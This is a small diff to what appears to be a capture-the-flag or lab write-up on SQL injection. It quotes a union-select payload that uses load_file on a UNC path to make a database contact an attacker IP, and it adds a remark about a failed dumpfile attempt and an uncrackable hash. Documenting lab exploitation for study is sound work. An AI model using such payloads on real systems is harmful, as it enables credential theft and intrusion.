@@ -161,7 +161,7 @@ Querying `term=1'union select load_file('\\\\10.10.14.2\\test'),2,3;-- -`
 
 ```
 
-I don't know why this worked and Osanda's did not. Obviously it uses a system command to reach out to a server similar to `net use \\IP\.` I will have to continue reading about it. 
+I don't know why this worked and Osanda's did not. Obviously it uses a system command to reach out to a server similar to `net use \\IP\.` Trying to get the SQL version number into a dumpfile did not seem to catch. I will have to continue reading about it. 
 
 Also, this hash does not seem crackable, taking note that we have another user named `Cortin.`
 
